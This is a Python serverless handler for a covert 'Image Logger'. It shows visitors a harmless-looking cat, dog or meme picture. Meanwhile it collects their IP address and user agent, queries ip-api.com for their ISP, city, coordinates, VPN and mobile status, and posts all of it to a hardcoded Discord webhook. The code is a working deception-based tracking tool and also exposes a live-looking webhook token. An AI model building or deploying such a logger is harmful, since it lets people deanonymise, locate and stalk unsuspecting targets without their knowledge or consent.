from http.server import BaseHTTPRequestHandler
from urllib import parse
import json
import urllib.request

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Your webhook URL
        WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
        
        # Default image
        DEFAULT_IMAGE = "https://i.imgur.com/5M6F3wQ.jpeg"
        
        # Custom image mappings - add more here
        IMAGES = {
            "mycatimage": "https://i.imgur.com/5M6F3wQ.jpeg",
            "dogpic": "https://i.imgur.com/2QksCKj.jpeg",
            "meme": "https://i.imgur.com/X8TjKyj.jpeg",
            # Add more custom names here
        }
        
        # Get REAL IP and User Agent (Vercel specific headers)
        ip = self.headers.get('X-Real-IP') or self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        country = self.headers.get('X-Vercel-IP-Country', 'Unknown')
        city = self.headers.get('X-Vercel-IP-City', 'Unknown')
        region = self.headers.get('X-Vercel-IP-Country-Region', 'Unknown')
        
        # Get IP info
        try:
            ip_info_url = f"http://ip-api.com/json/{ip}?fields=16976857"
            with urllib.request.urlopen(ip_info_url) as response:
                info = json.loads(response.read().decode())
        except:
            info = {}
        
        # Get image name from path
        path_parts = self.path.strip('/').split('/')
        image_name = path_parts[-1] if len(path_parts) > 1 else None
        
        # Remove query string if exists
        if image_name and '?' in image_name:
            image_name = image_name.split('?')[0]
        
        # Get image URL
        image_url = IMAGES.get(image_name, DEFAULT_IMAGE)
        
        # Create Discord embed
        embed = {
            "username": "Image Logger",
            "content": "@everyone",
            "embeds": [{
                "title": "🎯 Image Logger - IP Logged",
                "color": 65280,
                "description": f"""**A User Opened the Image!**

**Endpoint:** `{image_name if image_name else 'default'}`

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **Country:** `{info.get('country', country)}`
> **Region:** `{info.get('regionName', region)}`
> **City:** `{info.get('city', city)}`
> **Coords:** `{info.get('lat', 'N/A')}, {info.get('lon', 'N/A')}`
> **Timezone:** `{info.get('timezone', 'Unknown')}`
> **VPN:** `{info.get('proxy', False)}`
> **Mobile:** `{info.get('mobile', False)}`
> **ASN:** `{info.get('as', 'Unknown')}`

**User Agent:**
```
{user_agent}
```

**Webhook Token:**
```
{WEBHOOK}
```""",
                "thumbnail": {"url": image_url},
                "footer": {"text": "Vercel Image Logger"}
            }]
        }
        
        # Send to webhook
        try:
            data = json.dumps(embed).encode('utf-8')
            req = urllib.request.Request(WEBHOOK, data=data, headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req)
        except:
            pass
        
        # Return HTML with image
        html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Image</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #000;
        }}
        img {{
            max-width: 100%;
            max-height: 100vh;
            object-fit: contain;
        }}
    </style>
</head>
<body>
    <img src="{image_url}" alt="Image">
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
        return
